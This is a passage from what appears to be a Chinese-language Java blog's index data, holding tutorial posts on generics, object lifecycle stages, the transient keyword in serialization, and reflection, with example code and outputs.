Pattern","slug":"Design-Pattern","permalink":"http://swsmile.info/tags/Design-Pattern/"}]},{"title":"【Java】泛型（Generics）","date":"2019-04-02T13:26:13.000Z","path":"2019/04/02/【Java】类-泛型/","text":"什么是泛型（generics）？泛型（generics）是指参数化类型的能力。可以定义带泛型类型的类或方法，随后编译器会用具体的类型来代替它。 s 举个栗子问题引入12345678public static void main(String[] args) &#123; List list = new ArrayList(); list.add(\"1\"); list.add(2); int value1 = (int)list.get(0); int value2 = (int)list.get(1);&#125; 上述代码在编译期没有问题，但在运行期，将会报错。 1Exception in thread &quot;main&quot; java.lang.ClassCastException: java.lang.String cannot be cast to java.lang.Integer 因为对于List的add方法，传入参数的类型为Object，所以如果程序员在使用这个List对象实例时，不知道List对象实例中存储的元素的类型时，直接通过类型强行转换，可能就会报错。 解决使用泛型，将会解决这个问题。 如上的截图所示，当声明List所能装载的类型后，List的add方法就只能装载指定的类型，不然在编译期便会报错。 而且在读取值时，不再需要强制转换。 特性泛型只在编译阶段有效。看下面的代码： 1234567List&lt;String&gt; stringArrayList = new ArrayList&lt;String&gt;();List&lt;Integer&gt; integerArrayList = new ArrayList&lt;Integer&gt;();Class classStringArrayList = stringArrayList.getClass();Class classIntegerArrayList = integerArrayList.getClass();System.out.print(classStringArrayList.equals(classIntegerArrayList)); //true 分析通过上面的例子可以证明，在编译之后程序会采取去泛型化的措施。 也就是说Java中的泛型，只在编译阶段有效。 在编译过程中，正确检验泛型结果后，会将泛型的相关信息擦出，并且在对象进入和离开方法的边界处添加类型检查和类型转换的方法。也就是说，泛型信息不会进入到运行时阶段。 对此总结成一句话：泛型类型在逻辑上看以看成是多个不同的类型，实际上都是相同的基本类型。 泛型的使用泛型有三种使用方式，分别为：泛型类、泛型接口、泛型方法。 泛型类泛型类型用于类的定义中，被称为泛型类。通过泛型可以完成对一组类的操作对外开放相同的接口。最典型的就是各种容器类，如：List、Set、Map。 例子1一个普通的泛型类： 1234567891011121314//此处T可以随便写为任意标识，我们常用的表示泛型的标示包括T、E、K、V//在实例化泛型类时，必须指定T的具体类型public class Generic&lt;T&gt;&#123; //key这个成员变量的类型为T，T的类型由外部指定 private T key; public Generic(T key) &#123; //泛型构造方法形参key的类型也为T，T的类型由外部指定 this.key = key; &#125; public T getKey()&#123; //泛型方法getKey的返回值类型为T，T的类型由外部指定 return key; &#125;&#125; 调用12345678//泛型的类型参数只能是类类型（包括自定义类），不能是简单类型//传入的实参类型需与泛型的类型参数类型相同，即为Integer.Generic&lt;Integer&gt; genericInteger = new Generic&lt;Integer&gt;(123456);//传入的实参类型需与泛型的类型参数类型相同，即为String.Generic&lt;String&gt; genericString = new Generic&lt;String&gt;(\"key_vlaue\");System.out.println(\"key is \" + genericInteger.getKey()); //key is 123456System.out.println(\"key is \" + genericString.getKey()); // key is key_vlaue 例子2使用泛型类的时候，一定要传入泛型类型实参么？ 并不是这样。 事实上，在使用泛型的时候，如果传入泛型实参，则会根据传入的泛型实参做相应的限制，此时泛型才会起到保证类型约束的作用。 如果不传入泛型类型实参的话，在泛型类中使用泛型的方法或成员变量定义的类型可以为任何的类型。 比如： 123456789Generic generic1 = new Generic(\"111111\");Generic generic2 = new Generic(4444);Generic generic3 = new Generic(55.55);Generic generic4 = new Generic(false);System.out.println(\"key is \" + generic1.getKey()); // key is 111111System.out.println(\"key is \" + generic2.getKey()); // key is 4444System.out.println(\"key is \" + generic3.getKey()); // key is 55.55System.out.println(\"key is \" + generic4.getKey()); // key is false 注意泛型的类型参数只能是类类型，不能是简单类型。 多泛型变量定义在上面的例子中，我们只定义了一个泛型变量T，那如果我们需要传进去多个泛型要怎么办呢？ 只需要在类似下面这样就可以了： 1234567891011121314151617181920212223242526class MorePoint&lt;T,U&gt; &#123; private T x; private T y; private U name; public void setX(T x) &#123; this.x = x; &#125; public T getX() &#123; return this.x; &#125; ………… public void setName(U name)&#123; this.name = name; &#125; public U getName() &#123; return this.name; &#125; &#125; //使用 MorePoint&lt;Integer,String&gt; morePoint = new MorePoint&lt;Integer, String&gt;(); morePoint.setName(\"harvic\"); System.out.println(\"morPont.getName:\" + morePoint.getName()); 泛型接口泛型接口与泛型类的定义及使用基本相同。泛型接口常被用在各种类的生产器中，可以看一个例子： 1234//定义一个泛型接口public interface Generator&lt;T&gt; &#123; public T next();&#125; 当实现泛型接口的类，未传入泛型实参时： 1234567891011/** * 未传入泛型实参时，与泛型类的定义相同，在声明类的时候，需将泛型的声明也一起加到类中 * 即：class FruitGenerator&lt;T&gt; implements Generator&lt;T&gt;&#123; * 如果不声明泛型，如：class FruitGenerator implements Generator&lt;T&gt;，编译器会报错：\"Unknown class\" */class FruitGenerator&lt;T&gt; implements Generator&lt;T&gt;&#123; @Override public T next() &#123; return null; &#125;&#125; 当实现泛型接口的类，传入泛型实参时： 1234567891011121314151617/** * 传入泛型实参时： * 定义一个生产器实现这个接口,虽然我们只创建了一个泛型接口Generator&lt;T&gt; * 但是我们可以为T传入无数个实参，形成无数种类型的Generator接口。 * 在实现类实现泛型接口时，如已将泛型类型传入实参类型，则所有使用泛型的地方都要替换成传入的实参类型 * 即：Generator&lt;T&gt;，public T next();中的的T都要替换成传入的String类型。 */public class FruitGenerator implements Generator&lt;String&gt; &#123; private String[] fruits = new String[]&#123;\"Apple\", \"Banana\", \"Pear\"&#125;; @Override public String next() &#123; Random rand = new Random(); return fruits[rand.nextInt(3)]; &#125;&#125; 泛型方法泛型类，是在实例化类的时候指明泛型的具体类型；泛型方法，是在调用方法的时候指明泛型的具体类型 。 12345678910public class StaticFans &#123; //静态函数 public static &lt;T&gt; void StaticMethod(T a)&#123; System.out.println(\"StaticMethod: \"+a.toString()); &#125; //普通函数 public &lt;T&gt; void OtherMethod(T a)&#123; System.out.println(\"OtherMethod: \"+a.toString()); &#125; &#125; 上面分别是静态泛型函数和常规泛型函数的定义方法，与以往方法的唯一不同点就是在返回值前加上来表示泛型变量。其它没什么区别。 使用方法如下： 12345678//静态方法 StaticFans.StaticMethod(\"adfdsa\");//使用方法一 StaticFans.&lt;String&gt;StaticMethod(\"adfdsa\");//使用方法二 //常规方法 StaticFans staticFans = new StaticFans(); staticFans.OtherMethod(new Integer(123));//使用方法一 staticFans.&lt;Integer&gt;OtherMethod(new Integer(123));//使用方法二 泛型边界符现在我们要实现这样一个功能，查找一个泛型数组中大于某个特定元素的个数，我们可以这样实现： 1234567public static &lt;T&gt; int countGreaterThan(T[] anArray, T elem) &#123; int count = 0; for (T e : anArray) if (e &gt; elem) // compiler error ++count; return count;&#125; 但是这样很明显是错误的，因为除了short, int, double, long, float, byte, char等原始类型，其他的类并不一定能使用操作符&gt;，所以编译器报错，那怎么解决这个问题呢？答案是使用边界符。 123public interface Comparable&lt;T&gt; &#123; public int compareTo(T o);&#125; 做一个类似于下面这样的声明，这样就等于告诉编译器类型参数T代表的都是实现了Comparable接口的类，这样等于告诉编译器它们都至少实现了compareTo方法。 12345public static &lt;T extends Comparable&lt;T&gt;&gt; int countGreaterThan(T[] anArray, T elem) &#123; int count = 0; for (T e : anArray) if (e.compareTo(elem) &gt; 0) ++count; return count;&#125; 泛型通配符使用泛型的优点Java语言引入泛型的好处是安全简单。泛型的好处是在编译的时候检查类型安全，并且所有的强制转换都是自动和隐式的，提高代码的重用率。 具体来说： 类型安全。 泛型的主要目标是提高 Java 程序的类型安全。通过知道使用泛型定义的变量的类型限制，编译器可以在一个高得多的程度上验证类型假设。没有泛型，这些假设就只存在于程序员的头脑中（或者如果幸运的话，还存在于代码注释中）。 消除强制类型转换。泛型的一个附带好处是，消除源代码中的许多强制类型转换。这使得代码更加可读，并且减少了出错机会。 潜在的性能收益。 泛型为较大的优化带来可能。在泛型的初始实现中，编译器将强制类型转换（没有泛型的话，程序员会指定这些强制类型转换）插入生成的字节码中。但是更多类型信息可用于编译器这一事实，为未来版本的 JVM 的优化带来可能。由于泛型的实现方式，支持泛型（几乎）不需要 JVM 或类文件更改。所有工作都在编译器中完成，编译器生成类似于没有泛型（和强制类型转换）时所写的代码，只是更能确保类型安全而已。 使用泛型的一些规则与限制 泛型的类型参数只能是类类型（包括自定义类），不能是简单类型。 同一种泛型可以对应多个版本（因为参数类型是不确定的），不同版本的泛型类实例是不兼容的。 泛型的类型参数可以有多个。 泛型的参数类型可以使用extends语句，例如&lt;T extends superclass&gt;。习惯上称为“有界类型”。 泛型的参数类型还可以是通配符类型。例如Class&lt;?&gt; classType = Class.forName(Java.lang.String);。 Reference 为什么要用Java泛型 - https://www.cnblogs.com/zhengbin/p/5622621.html Java泛型详解：和Class的使用。泛型类，泛型方法的详细使用实例 - https://blog.csdn.net/qq_27093465/article/details/73229016 泛型：工作原理及其重要性 - https://www.oracle.com/technetwork/cn/articles/java/juneau-generics-2255374-zhs.html Java泛型详解 - http://www.importnew.com/24029.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】Java对象的生命周期","date":"2019-04-02T07:41:42.000Z","path":"2019/04/02/【Java】对象-Java对象的生命周期/","text":"Java对象的生命周期 在Java中，对象的生命周期包括以下几个阶段： 创建阶段（Created） 应用阶段（In Use） 不可见阶段（Invisible） 不可达阶段（Unreachable） 收集阶段（Collected） 终结阶段（Finalized） 对象空间重分配阶段（De-allocated） 1 创建阶段（Created）在创建阶段，系统通过下面的几个步骤来完成对象的创建过程： 为对象在堆中分配存储空间 开始构造对象 从超类到子类依次对static块、static成员进行初始化，初始化的顺序按照其书写的前后顺序（比如，一个static成员在static块之前，则将static成员先实例化） 超类成员变量按顺序初始化，递归调用超类的构造方法 子类成员变量按顺序初始化，子类构造方法调用 一旦对象被创建，并被分派给某些变量赋值，这个对象的状态就切换到了应用阶段 实验123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960public class Test &#123; static&#123; System.out.println(\"Test static\"); &#125; public static void main(String[] args) &#123; new E(); &#125;&#125; class A&#123; static&#123; System.out.println(\"A static\"); &#125; public A(String str) &#123; System.out.println(\"A \"+str); &#125;&#125;class B&#123; static&#123; System.out.println(\"B static\"); &#125; public B() &#123; System.out.println(\"B constructor\"); &#125;&#125;class C&#123; static&#123; System.out.println(\"C static\"); &#125; public C() &#123; System.out.println(\"C constructor\"); &#125;&#125; class D &#123; static&#123; System.out.println(\"D static\"); &#125; static B b = new B(); A a = new A(\"B's A\"); public D() &#123; System.out.println(\"D constructor\"); &#125;&#125;class E extends D &#123; static&#123; System.out.println(\"E static\"); &#125; static C c = new C(); A a = new A(\"C's A\"); public E() &#123; System.out.println(\"E constructor\"); &#125;&#125; 运行结果123456789101112Test staticD staticB staticB constructorE staticC staticC constructorA staticD&apos;s A constructorD constructorE&apos;s A constructorE constructor 分析 加载Test类：由于public static void main(String[] args)在Test类中定义，因此，在进入main函数的执行之前，先加载Test类。在类Test的类加载的初始化阶段，执行static块，对应输出Test static。 实例化一个类E对象 加载类D：由于类E从类D继承，因此先加载类D。在类D的类加载的初始化阶段，执行static块，并且初始化static成员变量。 执行类D的static块，对应输出D static。 初始化类D的static成员变量，即执行static B b = new B(); 加载类B，在类B的类加载的初始化阶段，执行static块，对应输出B static。 实例化类B对象。在类B加载完成后，通过调用类B的构造函数以实例化一个类B对象，对应输出B constructor。 加载类E： 执行类E的static块，对应输出E static。 初始化类E的static成员变量，即执行static C c = new C(); 加载类C，在类C的类加载的初始化阶段，执行static块，对应输出C static。 实例化类C对象。在类C加载完成后，通过调用类C的构造函数以实例化一个类C对象，对应输出C constructor。 实例化一个类D对象：由于类E从类D继承，因此，在实例化一个类E对象之前，需要先实例化一个类D对象 实例化类D对象的成员变量，对应执行A a = new A(&quot;D&#39;s A&quot;); 加载类A：在类A的类加载的初始化阶段，执行static块，对应输出A static。 实例化类A对象。在类A加载完成后，通过调用类A的构造函数以实例化一个类A对象，对应输出D&#39;s A constructor。 真正实例化类D对象。在类D的成员变量加载完成后，通过调用类D的构造函数以实例化一个类D对象，对应输出D constructor。 实例化一个类E对象： 实例化类E对象的成员变量，对应执行A a = new A(&quot;E&#39;s A&quot;); 实例化类A对象。由于类A之前已经加载过了，因此直接调用类A的构造函数以实例化一个类A对象，对应输出E&#39;s A constructor。 真正实例化类E对象。在类E的成员变量加载完成后，通过调用类E的构造函数以实例化一个类E对象，对应输出E constructor。 2 应用阶段（Using）对象至少被一个强引用（strong reference）持有着。 3 不可见阶段（Invisible）简单说就是程序的执行已经超出了该对象的作用域了。 举例如下面代码的System.out.println（count）;，count已经超出了其作用域，则称之为count处于不可视阶段。 当然这种情况编译器在编译的过程中会直接报错了。 1234567boolean has = false;while （has） &#123; int count = 0; count ++;&#125;System.out.println（count）; 4 不可达阶段（Unreachable）对象处于不可达阶段是指该对象不再被任何强引用所持有。 与“不可见阶段”相比，“不可见阶段”是指程序不再持有该对象的任何强引用。 5 已收集阶段（Collected）当垃圾回收器发现该对象已经处于“不可达阶段”，并且垃圾回收器已经对该对象的内存空间重新分配做好准备时，则对象进入了“收集阶段”。 如果该对象对应的类重写了finalize()方法，则会去执行该方法。 这里要特别说明一下：不要重载finazlie()方法！原因有两点： 会影响JVM的对象分配与回收速度在分配该对象时，JVM需要在垃圾回收器上注册该对象，以便在回收时能够执行该重载方法；在该方法的执行时需要消耗CPU时间且在执行完该方法后才会重新执行回收操作，即至少需要垃圾回收器对该对象执行两次GC。 可能造成该对象的再次“复活”在finalize()方法中，如果有其它的强引用再次持有该对象，则会导致对象的状态由“收集阶段”又重新变为“应用阶段”。这会破坏Java对象的生命周期。 6 终结阶段（Finalized）当对象执行完finalize()方法后仍然处于不可达状态时，则该对象进入终结阶段。在该阶段是等待垃圾回收器对该对象空间进行回收。 7 对象空间重新分配阶段（Free）垃圾回收器对该对象的所占用的内存空间进行回收或者再分配了，则该对象彻底消失了，称之为“对象空间重新分配阶段”。 Reference Java对象的生命周期 - https://www.jianshu.com/p/72a0e26d35bc","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】Java关键字-transient关键字","date":"2019-04-02T03:39:53.000Z","path":"2019/04/02/【Java】Java关键字-transient关键字/","text":"transient的作用我们都知道一个对象只要实现了Serilizable接口，这个对象就可以被序列化，Java的这种序列化模式为开发者提供了很多便利，我们可以不必关系具体序列化的过程，只要这个类实现了Serilizable接口，这个类的所有属性和方法都会自动序列化。 然而在实际开发过程中，我们常常会遇到这样的问题，这个类的有些属性需要序列化，而其他属性不需要被序列化。 打个比方，如果一个用户有一些敏感信息（如密码，银行卡号等），为了安全起见，不希望在网络操作（主要涉及到序列化操作，本地序列化缓存也适用）中被传输，这些信息对应的变量就可以加上transient关键字。 换句话说，这个字段的生命周期仅存于调用者的内存中而不会写到磁盘里持久化。 总之，java 的transient关键字为我们提供了便利，你只需要实现Serilizable接口，将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会序列化到指定的目的地中。transient的使用示范示例code如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class TransientTest &#123; public static void main(String[] args) &#123; User user = new User(); user.setUsername(\"Alexia\"); user.setPasswd(\"123456\"); System.out.println(\"read before Serializable: \"); System.out.println(\"username: \" + user.getUsername()); System.err.println(\"password: \" + user.getPasswd()); try &#123; ObjectOutputStream os = new ObjectOutputStream( new FileOutputStream(\"user.txt\")); os.writeObject(user); // 将User对象写进文件 os.flush(); os.close(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; try &#123; ObjectInputStream is = new ObjectInputStream(new FileInputStream( \"user.txt\")); user = (User) is.readObject(); // 从流中读取User的数据 is.close(); System.out.println(\"\\nread after Serializable: \"); System.out.println(\"username: \" + user.getUsername()); System.err.println(\"password: \" + user.getPasswd()); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125;&#125;class User implements Serializable &#123; private static final long serialVersionUID = 8294180014912103005L; private String username; private transient String passwd; public String getUsername() &#123; return username; &#125; public void setUsername(String username) &#123; this.username = username; &#125; public String getPasswd() &#123; return passwd; &#125; public void setPasswd(String passwd) &#123; this.passwd = passwd; &#125;&#125; 输出为： 1234567read before Serializable: username: Alexiapassword: 123456read after Serializable: username: Alexiapassword: null 密码字段为null，说明反序列化时根本没有从文件中获取到信息。 transient使用小结 一旦一个变量被transient修饰，这个变量将不再是对象持久化的一部分，该变量内容在序列化后无法获得访问。 transient关键字只能修饰变量，而不能修饰方法和类。注意，本地变量是不能被transient关键字修饰的。变量如果是用户自定义类变量，则该类需要实现Serializable接口。 被transient关键字修饰的变量不再能被序列化，一个静态变量不管是否被transient修饰，均不能被序列化。 实验对于第三点，可能我们会迷惑。 我们来做一个实验： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class TransientTest &#123; public static void main(String[] args) &#123; User user = new User(); user.setUsername(\"Alexia\"); user.setPasswd(\"123456\"); System.out.println(\"read before Serializable: \"); System.out.println(\"username: \" + user.getUsername()); System.err.println(\"password: \" + user.getPasswd()); try &#123; ObjectOutputStream os = new ObjectOutputStream( new FileOutputStream(\"user.txt\")); os.writeObject(user); // 将User对象写进文件 os.flush(); os.close(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; try &#123; // 在反序列化之前改变username的值 User.username = \"test\"; ObjectInputStream is = new ObjectInputStream(new FileInputStream( \"user.txt\")); user = (User) is.readObject(); // 从流中读取User的数据 is.close(); System.out.println(\"\\nread after Serializable: \"); System.out.println(\"username: \" + user.getUsername()); System.err.println(\"password: \" + user.getPasswd()); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125;&#125;class User implements Serializable &#123; private static final long serialVersionUID = 8294180014912103005L; public static String username; private transient String passwd; public String getUsername() &#123; return username; &#125; public void setUsername(String username) &#123; this.username = username; &#125; public String getPasswd() &#123; return passwd; &#125; public void setPasswd(String passwd) &#123; this.passwd = passwd; &#125;&#125; 分析事实上，在User类中的username字段前加上static关键字后，程序运行结果依然不变，即static类型的username也读出来为“Alexia”了。 这不与第三点说的矛盾吗？ 实际上是这样的：第三点确实没错（一个静态变量不管是否被transient修饰，均不能被序列化），反序列化后类中static字段的值等于当前这个类这个static字段的当前值。 因此，当我们增加了User.username = &quot;test&quot;;后，反序列化后的username的值应该为test。 运行结果1234567read before Serializable: username: Alexiapassword: 123456read after Serializable: username: testpassword: null 从运行结果来看，这符合我们的分析。 使被transient关键字修饰的变量被序列化思考下面的例子： 1234567891011121314151617181920212223242526272829303132333435363738394041import java.io.Externalizable;import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInput;import java.io.ObjectInputStream;import java.io.ObjectOutput;import java.io.ObjectOutputStream;public class ExternalizableTest implements Externalizable &#123; private transient String content = \"是的，我将会被序列化，不管我是否被transient关键字修饰\"; @Override public void writeExternal(ObjectOutput out) throws IOException &#123; out.writeObject(content); &#125; @Override public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException &#123; content = (String) in.readObject(); &#125; public static void main(String[] args) throws Exception &#123; ExternalizableTest et = new ExternalizableTest(); ObjectOutput out = new ObjectOutputStream(new FileOutputStream( new File(\"test\"))); out.writeObject(et); ObjectInput in = new ObjectInputStream(new FileInputStream(new File( \"test\"))); et = (ExternalizableTest) in.readObject(); System.out.println(et.content); out.close(); in.close(); &#125;&#125; 运行结果1是的，我将会被序列化，不管我是否被transient关键字修饰 分析这是为什么呢，不是说类的变量被transient关键字修饰以后将不能序列化了吗？ 我们知道，在Java中，对象的序列化可以通过实现两种接口来实现，若实现的是Serializable接口，则所有的序列化将会自动进行，若实现的是Externalizable接口，则没有任何东西可以自动序列化，需要在writeExternal方法中进行手工指定所要序列化的变量，这与是否被transient修饰无关。因此第二个例子输出的是变量content初始化的内容，而不是null。 Reference Java transient关键字使用小记 - https://www.cnblogs.com/lanxuezaipiao/p/3369962.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】反射（Reflection）","date":"2019-04-02T01:32:21.000Z","path":"2019/04/02/【Java】反射/","text":"什么是反射（Reflection）Java 反射机制使得程序在运行时，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性。这种 动态地获取类信息 以及 动态调用对象的方法 的功能称为 Java 的反射机制。 反射机制很重要的一点就是“运行时”，其使得我们可以在程序运行时加载、探索以及使用编译期间完全未知的 .class 文件。换句话说，Java 程序可以加载一个运行时才得知名称的 .class 文件，然后获悉其完整构造，并生成其对象实体、或对其 fields（变量）设值、或调用其 methods（方法）。 简而言之，通过反射，我们可以在运行时（runtime），获得程序或程序集中每一个类的成员和成员的信息。 程序中一般的对象的类型，都是在编译期就确定下来的，而 Java 反射机制可以让我们动态地创建对象并调用其属性，这样的对象的类型在编译期是未知的。所以我们可以通过反射机制直接创建对象，即使这个对象的类型在编译期是未知的。 反射的核心是， JVM 在运行时才动态加载类或调用方法/访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。 Java 反射主要提供以下功能： 在运行时判断任意一个对象所属的类； 在运行时构造任意一个类的对象； 在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）； 在运行时调用任意一个对象的方法 反射的主要用途很多人都认为反射在实际的 Java 开发应用中并不广泛，其实不然。当我们在使用 IDE(如 Eclipse，IDEA)时，当我们输入一个对象或类并想调用它的属性或方法时，一按点号，编译器就会自动列出它的属性或方法，这里就会用到反射。 反射最重要的用途就是开发各种通用框架。很多框架（比如 Spring）都是配置化的（比如通过 XML 文件配置 Bean），为了保证框架的通用性，它们可能需要根据配置文件加载不同的对象或类，调用不同的方法，这个时候就必须用到反射，运行时动态加载需要加载的对象。 举一个例子，在运用 Struts 2 框架的开发中我们一般会在 struts.xml 里去配置 Action，比如： 1234&lt;action name=\"login\" class=\"org.ScZyhSoft.test.action.SimpleLoginAction\" method=\"execute\"&gt; &lt;result&gt;/shop/shop-index.jsp&lt;/result&gt; &lt;result name=\"error\"&gt;login.jsp&lt;/result&gt;&lt;/action&gt; 配置文件与 Action 建立了一种映射关系，当 View 层发出请求时，请求会被 StrutsPrepareAndExecuteFilter 拦截，然后 StrutsPrepareAndExecuteFilter 会去动态地创建 Action 实例。比如我们请求 login.action，那么 StrutsPrepareAndExecuteFilter就会去解析struts.xml文件，检索action中name为login的Action，并根据class属性创建SimpleLoginAction实例，并用invoke方法来调用execute方法，这个过程离不开反射。 对与框架开发人员来说，反射虽小但作用非常大，它是各种容器实现的核心。而对于一般的开发者来说，不深入框架开发则用反射用的就会少一点，不过了解一下框架的底层机制有助于丰富自己的编程思想，也是很有益的。 使用反射获取类的信息1 获得一个类的 Class 对象方法有三种： (1) 使用 Class 类的 forName 静态方法来获得一个类的 Class 对象实例1public static Class&lt;?&gt; forName(String className) 比如在 JDBC 开发中常用此方法加载数据库驱动: 1Class.forName(driver); (2) 通过一个对象来获得一个类的 class 对象实例12Class&lt;?&gt; klass = int.class;Class&lt;?&gt; classInt = Integer.TYPE; (3) 调用某个对象实例的 getClass() 方法来获得一个类的 Class 对象实例12StringBuilder str = new StringBuilder(\"123\");Class&lt;?&gt; klass = str.getClass(); 2 获取类的成员变量（字段）信息主要是这几个方法： getFiled()：获取公有的成员变量 getDeclaredField()：获取所有已声明的成员变量，但不能得到其父类的成员变量 getFileds 和 getDeclaredFields 方法用法同上。 3 获取类中的方法获取某个Class对象的方法集合，主要有以下几个方法： getDeclaredMethods 方法getDeclaredMethods 方法返回类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法。 1public Method[] getDeclaredMethods() throws SecurityException getMethods 方法getMethods 方法返回某个类的所有公用（public）方法，包括其继承类的公用方法。 1public Method[] getMethods() throws SecurityException getMethod 方法getMethod方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应Class的对象。 1public Method getMethod(String name, Class&lt;?&gt;... parameterTypes) 例子 只是这样描述的话可能难以理解，我们用例子来理解这三个方法： 123456789101112131415161718192021222324252627282930313233343536import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class Test &#123; public static void test() throws IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123; Class&lt;?&gt; c = ClassA.class; Object object = c.newInstance(); //获取methodClass类的add方法 Method method = c.getMethod(\"add\", int.class, int.class); //getMethods()方法获取的所有方法 System.out.println(\"getMethods获取的方法：\"); Method[] methods = c.getMethods(); for (Method m : methods) System.out.println(m); //getDeclaredMethods()方法获取的所有方法 System.out.println(\"getDeclaredMethods获取的方法：\"); Method[] declaredMethods = c.getDeclaredMethods(); for (Method m : declaredMethods) System.out.println(m); &#125;&#125;class ClassA &#123; public final int fuck = 3; public int add(int a, int b) &#123; return a + b; &#125; public int sub(int a, int b) &#123; return a + b; &#125;&#125; 程序运行的结果如下: 12345678910111213141516getMethods获取的方法：public int org.ScZyhSoft.common.methodClass.add(int,int)public int org.ScZyhSoft.common.methodClass.sub(int,int)public final void java.lang.Object.wait() throws java.lang.InterruptedExceptionpublic final void java.lang.Object.wait(long,int) throws java.lang.InterruptedExceptionpublic final native void java.lang.Object.wait(long) throws java.lang.InterruptedExceptionpublic boolean java.lang.Object.equals(java.lang.Object)public java.lang.String java.lang.Object.toString()public native int java.lang.Object.hashCode()public final native java.lang.Class java.lang.Object.getClass()public final native void java.lang.Object.notify()public final native void java.lang.Object.notifyAll()getDeclaredMethods获取的方法：public int org.ScZyhSoft.common.methodClass.add(int,int)public int org.ScZyhSoft.common.methodClass.sub(int,int) 可以看到，通过 getMethods() 获取的方法可以获取到父类的方法,比如 java.lang.Object 下定义的各个方法。 4 获取构造器信息获取类构造器的用法与上述获取方法的用法类似。主要是通过Class类的getConstructor方法得到Constructor类的一个实例，而Constructor类有一个newInstance方法可以创建一个对象实例: 1public T newInstance(Object ... initargs) 此方法可以根据传入的参数来调用对应的Constructor创建对象实例。 5 判断是否为某个类的实例一般地，我们用 instanceof 关键字来判断是否为某个类的实例。同时我们也可以借助反射中 Class 对象的 isInstance() 方法来判断是否为某个类的实例，它是一个 native 方法： 1public native boolean isInstance(Object obj); 6 创建类的对象实例通过反射来生成对象主要有两种方式。 使用Class对象的newInstance()方法来创建Class对象对应类的实例。 12Class&lt;?&gt; c = String.class;Object str = c.newInstance(); 先通过Class对象获取指定的Constructor对象，再调用Constructor对象的newInstance()方法来创建实例。这种方法可以用指定的构造器构造类的实例。 1234567//获取String所对应的Class对象Class&lt;?&gt; c = String.class;//获取String类带一个String参数的构造器Constructor constructor = c.getConstructor(String.class);//根据构造器创建实例Object obj = constructor.newInstance(\"23333\");System.out.println(obj); 例子12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import java.lang.reflect.Constructor; class Person&#123; public Person() &#123; &#125; public Person(String name)&#123; this.name=name; &#125; public Person(int age)&#123; this.age=age; &#125; public Person(String name, int age) &#123; this.age=age; this.name=name; &#125; public String getName() &#123; return name; &#125; public int getAge() &#123; return age; &#125; @Override public String toString()&#123; return \"[\"+this.name+\" \"+this.age+\"]\"; &#125; private String name; private int age;&#125; class hello&#123; public static void main(String[] args) &#123; Class&lt;?&gt; demo=null; try&#123; demo=Class.forName(\"Reflect.Person\"); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; Person per1=null; Person per2=null; Person per3=null; Person per4=null; //取得全部的构造函数 Constructor&lt;?&gt; cons[]=demo.getConstructors(); try&#123; per1=(Person)cons[0].newInstance(); per2=(Person)cons[1].newInstance(\"Rollen\"); per3=(Person)cons[2].newInstance(20); per4=(Person)cons[3].newInstance(\"Rollen\",20); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; System.out.println(per1); System.out.println(per2); System.out.println(per3); System.out.println(per4); &#125;&#125; 7 调用方法当我们从类中获取了一个方法后，我们就可以用 invoke() 方法来调用这个方法。invoke 方法的签名为: 123public Object invoke(Object obj, Object... args) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException 下面是一个实例： 1234567891011121314151617181920212223242526public class Test &#123; public static void main(String[] args) throws IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123; Class&lt;?&gt; klass = methodClass.class; //创建methodClass的实例 Object obj = klass.newInstance(); //获取methodClass类的add方法 Method method = klass.getMethod(\"add\", int.class, int.class); //调用method对应的方法 =&gt; add(1,4) Object result = method.invoke(obj, 1, 4); System.out.println(result); &#125;&#125;class methodClass &#123; public final int fuck = 3; public int add(int a, int b) &#123; return a + b; &#125; public int sub(int a, int b) &#123; return a + b; &#125;&#125; 关于 invoke 方法的详解，后面我会专门写一篇文章来深入解析 invoke 的过程。 调用或修改类的私有变量和方法在上面，我们成功获取了类的变量和方法信息，验证了在运行时 动态的获取信息 的观点。那么，仅仅是获取信息吗？我们接着往后看。 